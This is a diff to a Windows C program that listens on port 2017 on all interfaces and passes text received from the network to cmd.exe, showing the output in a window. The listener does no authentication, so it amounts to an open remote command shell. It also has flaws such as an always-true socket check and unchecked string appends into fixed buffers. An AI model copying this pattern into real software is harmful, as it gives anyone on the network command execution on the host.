@@ -35,6 +35,9 @@ INT InitNetwork()
 	BindAddress.sin_addr.S_un.S_addr = INADDR_ANY;
 	BindAddress.sin_port = htons(2017);
 
+	const int reuse = 1;
+	setsockopt(Sock, SOL_SOCKET, SO_REUSEADDR, (const char*)&reuse, sizeof(reuse));
+
 	iResult = bind(Sock, (const sockaddr*)&BindAddress, sizeof(BindAddress));
 	if (iResult != 0)
 	{
@@ -76,9 +79,9 @@ DWORD WINAPI NetThreadProc(LPVOID lParam)
 
 VOID ParseData(HWND hOutput, TCHAR szDataRecv[], UINT RecvSize, IN_ADDR fromAddress)
 {
-	TCHAR *szDisplayBuffer = (TCHAR *)LocalAlloc(LMEM_ZEROINIT, BUFFER_LEN * 60);
-	TCHAR *szDisplayBufferB = (TCHAR *)LocalAlloc(LMEM_ZEROINIT, BUFFER_LEN * 60);
-	GetWindowText(hOutput, szDisplayBuffer, BUFFER_LEN * 30);
+	TCHAR *szDisplayBuffer = (TCHAR *)LocalAlloc(LMEM_ZEROINIT, BUFFER_LEN * 200);
+	TCHAR *szDisplayBufferB = (TCHAR *)LocalAlloc(LMEM_ZEROINIT, BUFFER_LEN * 200);
+	GetWindowText(hOutput, szDisplayBuffer, BUFFER_LEN * 100);
 
 	if (RecvSize != BUFFER_LEN * 2)
 	{
@@ -140,11 +143,13 @@ VOID ParseData(HWND hOutput, TCHAR szDataRecv[], UINT RecvSize, IN_ADDR fromAddr
 
 		if (ExecuteCommand(hOutput, szBuffer) == TRUE)
 		{
+			GetWindowText(hOutput, szDisplayBufferB, BUFFER_LEN * 100);
 			wsprintf(szDisplayBuffer,
 				TEXT("%sExecute Success!\r\n"), szDisplayBufferB);
 		}
 		else
 		{
+			GetWindowText(hOutput, szDisplayBufferB, BUFFER_LEN * 100);
 			wsprintf(szDisplayBuffer,
 				TEXT("%sExecute Fail!\r\n"), szDisplayBufferB);
 		}
@@ -165,8 +170,11 @@ VOID ParseData(HWND hOutput, TCHAR szDataRecv[], UINT RecvSize, IN_ADDR fromAddr
 
 VOID CleanNetwork(INT Sock)
 {
+	int error = WSAGetLastError();
+
 	if (Sock != INVALID_SOCKET || Sock != 0)
 	{
+		shutdown(Sock, SD_BOTH);
 		closesocket(Sock);
 	}
 
@@ -209,17 +217,45 @@ BOOL ExecuteCommand(HWND hOutput, const LPTSTR lpCmdLine)
 	ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));
 	TCHAR szCmdPath[MAX_PATH] = { 0 };
 	GetSystemDirectory(szCmdPath, MAX_PATH);
-	lstrcat(szCmdPath, TEXT("\\cmd.exe"));
+	lstrcat(szCmdPath, TEXT("\\cmd.exe /K cls"));
 
-	CreateProcess(NULL, szCmdPath, NULL, NULL, TRUE, 0, NULL, NULL, &StartInfo, &ProcessInfo);
+	bResult = CreateProcess(NULL, szCmdPath, NULL, NULL, TRUE, 0, NULL, NULL, &StartInfo, &ProcessInfo);
+	if (bResult != TRUE)
+	{
+		CloseHandle(hStdinRead);
+		CloseHandle(hStdinWrite);
+		CloseHandle(hStdoutRead);
+		CloseHandle(hStdoutWrite);
+		return FALSE;
+	}
 
+	lstrcat(lpCmdLine, TEXT("\r\n"));
+	CHAR *ASCIICmdLine = UnicodeToANSI(lpCmdLine);
 
-	Sleep(1000);
 	DWORD dActualRead = 0;
-	CHAR szBuffer[1024] = { 0 };
-	ReadFile(hStdoutRead, szBuffer, 1024, &dActualRead, NULL);
+	CHAR *szBuffer = (CHAR *)LocalAlloc(LMEM_ZEROINIT, BUFFER_LEN * 200);
+	CHAR *szDisplayBuffer = (CHAR *)LocalAlloc(LMEM_ZEROINIT, BUFFER_LEN * 200);
+	CHAR *szDisplayBufferB = (CHAR *)LocalAlloc(LMEM_ZEROINIT, BUFFER_LEN * 200);
 
-	MessageBoxA(NULL, szBuffer, 0, 0);
+	DWORD ActualWrite = 0;
+	ReadFile(hStdoutRead, szBuffer, BUFFER_LEN * 200, &dActualRead, NULL);
+	WriteFile(hStdinWrite, ASCIICmdLine, lstrlenA(ASCIICmdLine), &ActualWrite, NULL);
+	WriteFile(hStdinWrite, "exit\n", sizeof("exit\n") - 1, &ActualWrite, NULL);
+	free(ASCIICmdLine);
+
+	WaitForSingleObject(ProcessInfo.hProcess, 3000);
+	TerminateProcess(ProcessInfo.hProcess, 0);
+	ReadFile(hStdoutRead, szBuffer, BUFFER_LEN * 200, &dActualRead, NULL);
+	GetWindowTextA(hOutput, szDisplayBuffer, BUFFER_LEN * 100);
+	
+	wsprintfA(szDisplayBufferB, "%s-------------%s\r\n-------------\r\n",
+		szDisplayBuffer, szBuffer);
+
+	SetWindowTextA(hOutput, szDisplayBufferB);
+
+	LocalFree(szBuffer);
+	LocalFree(szDisplayBuffer);
+	LocalFree(szDisplayBufferB);
 
 	return TRUE;
 }
@@ -279,4 +315,13 @@ wchar_t * ANSIToUnicode(const char* str)
 	MultiByteToWideChar(CP_ACP, 0, str, -1, (LPTSTR)result, textlen);
 	return result;
 }
-
+char * UnicodeToANSI(const wchar_t *str)
+{
+	char * result;
+	int textlen;
+	textlen = WideCharToMultiByte(CP_ACP, 0, str, -1, NULL, 0, NULL, NULL);
+	result = (char *)malloc((textlen + 1) * sizeof(char));
+	memset(result, 0, sizeof(char) * (textlen + 1));
+	WideCharToMultiByte(CP_ACP, 0, str, -1, result, textlen, NULL, NULL);
+	return result;
+}
